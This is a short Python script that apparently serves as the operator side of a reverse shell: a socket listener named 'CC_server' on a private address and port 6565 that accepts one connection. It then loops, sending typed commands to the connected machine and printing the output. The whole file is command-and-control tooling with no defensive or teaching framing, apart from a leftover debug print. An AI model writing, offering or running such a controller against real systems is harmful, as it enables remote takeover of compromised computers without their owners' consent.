import  socket
import subprocess


HOST = "192.168.30.52"
PORT = 6565



def connection(client):
    
    while 1:
        pwd = client.recv(1024).decode('utf-8')+"->"
        command = input(pwd)
        if command != "":
            print("hello")
            client.send(command.encode('utf-8'))
            print(f"{client.recv(1024).decode('utf-8')}")
       



CC_server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
CC_server.bind((HOST,PORT))
CC_server.listen(5)
print(f"[*] Listening on {HOST}:{PORT}")

CC_client, address = CC_server.accept()
print(f"[*] Connection from {address[0]}:{address[1]}")
connection(CC_client)



